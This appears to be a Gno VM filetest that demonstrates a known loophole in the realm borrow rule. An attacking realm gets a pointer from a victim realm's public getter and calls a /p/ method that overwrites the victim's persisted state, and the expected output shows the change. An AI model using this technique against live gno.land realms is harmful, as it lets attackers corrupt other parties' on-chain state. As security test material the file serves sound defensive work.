// PKGPATH: gno.land/r/launderc
package launderc

// Attack C: known-open loophole — /p/-method borrow rule.
//
// Attacker obtains a pointer to victim's g via the victim's
// public-by-design getter, then invokes a /p/-defined method on it.
// PushFrameCall's borrow rule 2 sees recv.PkgID = laundervictim and
// borrows m.Realm to laundervictim for the duration of the /p/
// method call. Inside the /p/ method body, the write to o.Field
// sees base.PkgID = laundervictim AND m.Realm = laundervictim —
// match, no readonly check fires. The write succeeds and victim's
// persistent state is mutated.
//
// This is the foundational tension in the borrow rule: /p/ methods
// are designed to mutate /r/ state (so list/map/avl etc. work), but
// once a victim exposes a pointer, anyone holding it can invoke any
// /p/ method declared on that type with victim authority.

import (
	"gno.land/r/tests/vm/laundervictim"
)

func main(cur realm) {
	println("before:", laundervictim.ReadPtr())

	// Obtain pointer to victim's persisted Object.
	p := laundervictim.GetPtr()

	// Invoke the /p/ method Set — borrow rule routes m.Realm to
	// laundervictim for the duration of Set. The write succeeds.
	p.Set("pwnd-via-pmethod")

	println("after: ", laundervictim.ReadPtr())
}

// Output:
// before: original-ptr
// after:  pwnd-via-pmethod
